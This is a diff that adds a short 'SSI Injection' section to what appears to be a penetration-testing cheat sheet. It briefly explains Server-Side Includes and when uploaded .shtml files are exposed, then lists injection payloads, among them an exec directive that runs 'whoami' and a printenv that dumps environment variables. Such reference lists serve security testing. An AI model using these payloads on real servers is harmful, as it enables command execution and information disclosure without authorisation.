@@ -241,3 +241,12 @@ SSTI Tools
 ___________________________________________________________________________________________
 
 SSI Injection
+Server-Side Includes (SSI) is a technology web applications use to create dynamic content on HTML pages. SSI is supported by many popular web servers such as 
+Apache and IIS.
+Happen: When file is uploaded (.shtml, .shtm, and .stm) and also when web application have page such as page.shtm
+printenv : <!--#printenv -->
+config : <!--#config errmsg="Error!" -->
+echo : <!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" -->
+exec : <!--#exec cmd="whoami" -->
+include : <!--#include virtual="index.html" -->
+
